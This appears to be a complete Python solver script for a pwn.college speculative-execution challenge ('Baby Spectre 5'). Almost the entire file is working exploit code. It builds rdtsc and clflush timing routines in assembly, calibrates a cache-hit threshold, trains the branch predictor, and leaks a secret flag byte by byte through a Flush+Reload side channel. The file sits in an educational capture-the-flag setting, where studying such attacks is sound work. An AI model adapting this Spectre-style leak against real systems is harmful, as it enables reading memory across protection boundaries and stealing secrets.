#!/nix/store/cdaifv92znxy5ai4sawricjl0p5b9sgf-python3-3.13.11/bin/python3.13
# Microarchitecture Exploitation - Baby Spectre 5
# https://pwn.college/system-security/speculative-execution/babyarch-speculate
import ctypes
import mmap
import os
import random
import site
import statistics
import sys
import time
from collections import defaultdict

site.addsitedir(
    "/nix/store/8rkdh1mj5w4ysz03j9n5xcdamcwrdwjd-python3-3.13.11-env/lib/python3.13/site-packages"
)
import pwn
import rich
from dojotool import find_challenge, submit
from dojotool.pwntool import tee


def percentile(data: list[int], p: int) -> int:
    return int(statistics.quantiles(data, n=100)[p - 1])


def measure_cache_timing(addr: int, samples: int) -> tuple[list[int], list[int]]:
    """Collect randomly interleaved cache-hit and cache-miss timings."""
    for rounds in [1000, samples]:  # add a warmup round
        hits, misses = [], []
        for _ in range(rounds):
            if random.getrandbits(1):
                # touch the address to ensure it's in the cache
                _ = ctypes.c_uint8.from_address(addr).value
                hits.append(measure_access(addr))
            else:
                flush_addr(addr)
                misses.append(measure_access(addr))

    return hits, misses


def show_cache_timing(hits: list[int], misses: list[int], threshold: int) -> None:
    hit_p99 = percentile(hits, 99)
    miss_p01 = percentile(misses, 1)
    hit_accuracy = sum(t < threshold for t in hits) / len(hits) * 100
    miss_accuracy = sum(t >= threshold for t in misses) / len(misses) * 100

    rich.print(
        f"cache hit   samples={len(hits):5d} min={min(hits):4d} median={statistics.median(hits):6.1f} p99={hit_p99:4d}"
    )
    rich.print(
        f"cache miss  samples={len(misses):5d} min={min(misses):4d} median={statistics.median(misses):6.1f} p01={miss_p01:4d}"
    )
    rich.print(f"threshold   {threshold} cycles")
    rich.print(f"accuracy    hit={hit_accuracy:6.2f}% miss={miss_accuracy:6.2f}%")


def make_function(asm_code, restype, argtypes):
    code = pwn.asm(asm_code)
    size = len(code)
    mem = mmap.mmap(-1, size, prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
    mem.write(code)
    addr = ctypes.addressof(ctypes.c_char.from_buffer(mem))
    func_type = ctypes.CFUNCTYPE(restype, *argtypes)
    func = func_type(addr)
    func._mmap = mem  # type: ignore 保持 mmap 存活
    return func


# uint64_t measure_access(void *addr)
measure_access = make_function(
    r"""
    lfence
    rdtsc
    shl     rdx, 32
    or      rax, rdx
    mov     r8, rax

    movzx   eax, byte ptr [rdi]

    rdtscp
    shl     rdx, 32
    or      rax, rdx
    mov     r9, rax

    lfence

    mov     rax, r9
    sub     rax, r8

    clflush byte ptr [rdi]
    mfence
    ret
""",
    ctypes.c_uint64,
    [ctypes.c_void_p],
)

# void flush_addr(void *addr)
flush_addr = make_function(
    r"""
    clflush byte ptr [rdi]
    mfence
    ret
""",
    None,
    [ctypes.c_void_p],
)


def inside_challenge() -> None:
    SHM = 0x1337000
    PROBE = SHM + 0x1000
    PAGE_COUNT = 0x100

    index = ctypes.c_int.from_address(SHM + 32)
    sem_post = ctypes.CDLL(None).sem_post
    sem_post.argtypes = [ctypes.c_void_p]
    sem_post.restype = ctypes.c_int
    semaphore = ctypes.c_void_p(SHM)

    def flush_cache():
        for i in range(PAGE_COUNT):
            flush_addr(PROBE + i * 0x1000)

    def get_timing_data() -> list[int]:
        times = [0] * PAGE_COUNT
        for i in range(PAGE_COUNT):
            # Pseudo-random jumps to defeat hardware prefetchers
            i = (i * 0xA7 + 0x0D) & 0xFF
            times[i] = measure_access(PROBE + i * 0x1000)
        return times

    def trigger(pos: int):
        index.value = pos
        sem_post(semaphore)
        time.sleep(0.000001)

    def train():
        # Train the branch predictor by repeatedly taking the true branch
        for _ in range(32):
            trigger(258)

    def leak_byte(pos: int, threshold: int) -> int:
        votes = defaultdict(int)
        # collect enough votes to overcome noise
        while sum(votes.values()) < 3:
            train()
            flush_cache()
            trigger(pos)
            for i, t in enumerate(get_timing_data()):
                if i == 0:  # 0x00 is not a valid character
                    continue
                if t < threshold:
                    votes[i] += 1
            if len(votes) > 5:  # too many false positives, reset and try again
                votes.clear()
        return max(votes, key=votes.get, default=0)  # type: ignore

    calibration_samples = 50_000
    pwn.info("calibrating cache threshold")
    rich.print(f"probe       {hex(PROBE)}")
    rich.print(f"samples     {calibration_samples}")
    hits, misses = measure_cache_timing(PROBE, calibration_samples)
    THRESHOLD = (percentile(hits, 99) + percentile(misses, 1)) // 2
    show_cache_timing(hits, misses, THRESHOLD)

    pwn.info("starting speculative leak")

    flag = bytearray()
    for pos in range(64):
        leaked = 0
        while not (0x20 < leaked < 0x7F):
            leaked = leak_byte(pos, THRESHOLD)

        flag.append(leaked)
        print(f"[{pos:2d}] 0x{leaked:02x} '{chr(leaked)}'", flush=True)
        if leaked == ord("}"):
            break

    flag = flag.decode()
    print("FLAG:", flag)
    submit(flag)

    sem_post(semaphore)
    os._exit(0)


def ctf() -> None:
    os.chmod(__file__, 0o755)
    with pwn.process([find_challenge(), __file__], raw=True, level="error") as io:
        tee(io)
        io.recvrepeat()


if __name__ == "__main__":
    if len(sys.argv) > 1:
        ctf()
    else:
        inside_challenge()
